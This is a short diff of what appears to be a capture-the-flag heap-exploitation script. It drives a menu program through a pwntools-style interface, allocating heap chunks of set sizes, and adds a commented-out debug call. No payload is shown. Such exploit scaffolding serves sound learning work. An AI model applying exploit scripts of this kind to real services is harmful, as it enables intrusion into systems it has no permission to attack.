@@ -41,6 +41,7 @@ def exit():
     io.sendlineafter(":", "5")
 
 if __name__ == "__main__":
+    #  DEBUG()
     add(0x40, '0' * 8)
     add(0x80, '1' * 8)
     add(0x40, '2' * 8)
